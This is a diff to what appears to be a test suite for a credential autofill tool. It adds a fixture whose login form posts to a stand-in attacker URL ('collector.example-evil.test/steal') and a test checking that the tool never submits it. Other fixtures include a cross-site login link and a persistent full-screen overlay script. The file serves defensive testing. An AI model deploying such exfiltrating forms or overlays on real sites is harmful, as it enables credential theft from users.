@@ -55,6 +55,7 @@ const pages = {
   'captcha.example.test/': doc(`${loginForm('/never')}<div class="g-captcha" style="width:300px;height:70px">check</div>`),
   'jump.example.test/': doc('<a href="https://jump.example-evil.test/login">Log in</a>'),
   'leak.example.test/': doc(loginForm('https://collector.example-evil.test/steal')),
+  'formjump.example.test/': doc('<form method="post" action="https://collector.example-evil.test/steal"><button>Log in</button></form>'),
   'member.example.test/': doc(`<nav hidden><a href="/out">Log out</a></nav>${loginForm('/never')}`),
   'join.example.test/signup': doc(loginForm('/never')),
   // Synthetic: a sign-in link folded into a collapsed account menu, as reported on Allegro (real DOM not captured).
@@ -64,7 +65,7 @@ const pages = {
   'cover.example.test/': doc(`${loginForm('/never')}<div style="position:fixed;inset:0;z-index:2147483647;background:#0003" id="cover"></div><script>setInterval(()=>{const c=document.querySelector('#cover');if(document.documentElement.lastElementChild!==c)document.documentElement.append(c)},50)</script>`),
 };
 const entries = [['AWS', 'console.aws.amazon.com', true], ['X', 'x.com'], ['LinkedIn', 'www.linkedin.com'], ['GitHub', 'github.com'],
-  ...['wrong', 'totp', 'sms', 'captcha', 'jump', 'leak', 'member', 'join', 'cover', 'menu'].map(name => [name, `${name}.example.test`, name === 'totp'])];
+  ...['wrong', 'totp', 'sms', 'captcha', 'jump', 'leak', 'member', 'join', 'cover', 'menu', 'formjump'].map(name => [name, `${name}.example.test`, name === 'totp'])];
 try {
   const vault = api.vaults[0];
   for (const [label, host, withTotp] of entries) {
@@ -188,6 +189,10 @@ try {
     async crossSite() {
       await signIn('https://jump.example.test/'); await says('Finish on this page');
       assert.equal(requests.some(item => item.key.includes('example-evil')), false); pass('never follows a sign-in link to another site');
+    },
+    async formJump() {
+      await signIn('https://formjump.example.test/'); await says('Finish on this page');
+      assert.equal(requests.some(item => item.key.includes('example-evil')), false); pass('never clicks a sign-in control whose form posts to another site');
     },
     async leak() {
       await signIn('https://leak.example.test/'); await says('Finish on this page');
